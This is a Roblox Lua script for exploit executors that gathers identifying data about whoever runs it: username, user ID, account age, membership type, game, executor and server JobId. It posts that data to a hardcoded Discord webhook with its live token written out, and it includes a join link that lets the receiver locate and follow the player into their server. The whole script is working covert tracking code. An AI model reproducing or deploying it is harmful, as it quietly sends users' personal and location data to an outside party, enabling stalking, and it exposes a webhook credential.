local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer
repeat
    LocalPlayer = Players.LocalPlayer
    task.wait(0.1) 
until LocalPlayer

local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name

local function getPlayerPfpUrl(userId)
    local success, result = pcall(function()
        local thumbnailApiUrl = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false"
        return game:HttpGet(thumbnailApiUrl)
    end)
    
    if success and result then
        local thumbnailData = HttpService:JSONDecode(result)
        if thumbnailData and thumbnailData.data and thumbnailData.data[1] and thumbnailData.data[1].imageUrl then
            return thumbnailData.data[1].imageUrl
        end
    end
    return "https://www.roblox.com/asset/?id=403652994"
end

local playerPfpUrl = getPlayerPfpUrl(UserId)

local success, gameThumbnailJson = pcall(function()
    local gameThumbnailUrl = "https://thumbnails.roblox.com/v1/places/gameicons?placeIds=" .. game.PlaceId .. "&size=150x150&format=Png&isCircular=false"
    return game:HttpGet(gameThumbnailUrl)
end)
local gameThumbnailUrlFinal = "https://www.roblox.com/asset/?id=403652994"
if success and gameThumbnailJson then
    local gameThumbnailData = HttpService:JSONDecode(gameThumbnailJson)
    if gameThumbnailData and gameThumbnailData.data and gameThumbnailData.data[1] and gameThumbnailData.data[1].imageUrl then
        gameThumbnailUrlFinal = gameThumbnailData.data[1].imageUrl
    end
end

local function detectExecutor()
    return identifyexecutor() or "Unknown"
end

local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId

    local data = {
        content = "",
        embeds = {{
            author = { 
                name = "Script Execution Detected", 
                url = gameLink
            },
            description = "**Player Information**\n" ..
                string.format(
                    "• [Display Name](%s): %s\n• Username: %s\n• User ID: %d\n• Membership Type: %s\n• Account Age: %d days\n\n",
                    playerLink, DisplayName, Username, UserId, MembershipType, AccountAge
                ) ..
                "**Game Information**\n" ..
                string.format(
                    "• [Game Name](%s): %s\n• Game ID: %d\n• Executor: %s\n• [Join on Mobile](%s)\n\n",
                    gameLink, GameName, game.PlaceId, executor, mobileJoinLink
                ) ..
                "**Server**\n" ..
                string.format("**Job ID:**\n```%s```", game.JobId),
            color = tonumber("0x3498db"),
            thumbnail = { url = gameThumbnailUrlFinal },
            image = { url = playerPfpUrl },
            footer = { text = string.format("Date: %s | Time: %s", date, time) }
        }}
    }
    return HttpService:JSONEncode(data)
end

local function sendToProxy(proxyUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local proxyRequest = {
        Url = proxyUrl,
        Body = data,
        Method = "POST",
        Headers = headers
    }
    
    local success, response = pcall(function()
        return request(proxyRequest)
    end)
    
    if not success then
        warn("Webhook request failed, send this error in the Stalkie server:", response)
    end
end

local PROXY_URL = "https://discord.com/api/webhooks/1376968568125653232/5_LWGiqVplyLd3gjOZ-JDFAAw6hQjOhqf2IgfWtY5ZRpgyptBJJs2-sqNK6orB_bPd_1 "
local webhookData = createWebhookData()

sendToProxy(PROXY_URL, webhookData)
